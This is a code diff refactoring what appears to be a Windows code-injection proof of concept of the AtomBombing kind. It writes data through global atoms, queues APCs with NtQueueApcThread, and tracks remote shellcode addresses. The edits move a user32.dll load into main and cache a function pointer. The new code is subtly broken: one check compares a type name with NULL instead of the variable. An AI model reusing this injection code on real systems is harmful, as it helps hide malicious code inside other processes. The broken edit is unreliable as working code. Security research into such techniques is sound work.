@@ -161,16 +161,7 @@ ESTATUS main_WasAtomWrittenSuccessfully(
 	DWORD cbCheckBuffer = 0;
 	ESTATUS eReturn = ESTATUS_INVALID;
 	UINT uiRet = 0;
-	HMODULE hUser32 = NULL;
 	BOOL bWasAtomWrittenSuccessfully = FALSE;
-
-	// If user32.dll is not loaded, the ATOM functions return access denied.For more details see :
-	// http://www.tech-archive.net/Archive/Development/microsoft.public.win32.programmer.kernel/2004-03/0851.html
-	hUser32 = LoadLibrary(L"user32.dll");
-	if (NULL == hUser32)
-	{
-		goto lblCleanup;
-	}
 
 	cbCheckBuffer = (wcslen(pswzExpectedBuffer) + 1) * sizeof(WCHAR);
 
@@ -185,7 +176,7 @@ ESTATUS main_WasAtomWrittenSuccessfully(
 	uiRet = GlobalGetAtomNameW(tAtom, pswzCheckBuffer, cbCheckBuffer);
 	if (0 == uiRet)
 	{
-		printf("GlobalGetAtomNameA failed. GLE: 0x%X (%d)\n\n", GetLastError(), GetLastError());
+		printf("GlobalGetAtomNameW failed. GLE: 0x%X (%d)\n\n", GetLastError(), GetLastError());
 		eReturn = ESTATUS_MAIN_WASATOMWRITTENSUCCESSFULLY_GLOBALGETATOMNAMEW_FAILED;
 		goto lblCleanup;
 	}
@@ -223,7 +214,7 @@ ESTATUS main_AddNullTerminatedAtomAndVerifyW(LPWSTR pswzBuffer, ATOM *ptAtom)
 		tAtom = GlobalAddAtomW(pswzBuffer);
 		if (0 == tAtom)
 		{
-			printf("GlobalAddAtomA failed. GLE: 0x%X (%d)\n\n", GetLastError(), GetLastError());
+			printf("GlobalAddAtomW failed. GLE: 0x%X (%d)\n\n", GetLastError(), GetLastError());
 			eReturn = ESTATUS_MAIN_ADDNULLTERMINATEDATOMANDVERIFYW_GLOBALADDATOMW_FAILED;
 			goto lblCleanup;
 		}
@@ -268,29 +259,22 @@ ESTATUS main_NtQueueApcThreadWrapper(
 	PVOID pvArg3
 	)
 {
-	HMODULE hNtDll = NULL;
-	HMODULE hKernel32 = NULL;
-	HMODULE hUser32 = NULL;
-	_NtQueueApcThread NtQueueApcThread = NULL;
+	static _NtQueueApcThread NtQueueApcThread = NULL;
 	NTSTATUS ntStatus = NULL;
 	ESTATUS eReturn = ESTATUS_INVALID;
-
-	// If user32.dll is not loaded, the ATOM functions return access denied. For more details see:
-	// http://www.tech-archive.net/Archive/Development/microsoft.public.win32.programmer.kernel/2004-03/0851.html
-	hUser32 = LoadLibrary(L"user32.dll");
-	hKernel32 = GetModuleHandle(L"kernel32.dll");
-	hNtDll = GetModuleHandle(L"ntdll.dll");
-
-	eReturn = GetFunctionAddressFromDll(
+	
+	if (_NtQueueApcThread == NULL){
+		eReturn = GetFunctionAddressFromDll(
 		NTDLL, 
 		NTQUEUEAPCTHREAD, 
 		(PVOID *) &NtQueueApcThread
 		);
-	if (ESTATUS_FAILED(eReturn))
-	{
-		goto lblCleanup;
-	}
+		if (ESTATUS_FAILED(eReturn))
+		{
+			goto lblCleanup;
+		}
 
+	}
 	ntStatus = NtQueueApcThread(
 		hThread, 
 		pfnApcRoutine, 
@@ -1691,6 +1675,11 @@ lblCleanup:
 
 int main()
 {
+	HANDLE hUser32 = LoadLibrary("User32.dll");
+	if (hUser32 == NULL){
+		// just perform the check once in main
+		return 0;
+	}
 	ESTATUS eReturn = ESTATUS_INVALID;
 	PVOID pvRemoteShellcodeAddress = NULL;
 	PVOID pvRemoteGetProcAddressLoadLibraryAddress = NULL;
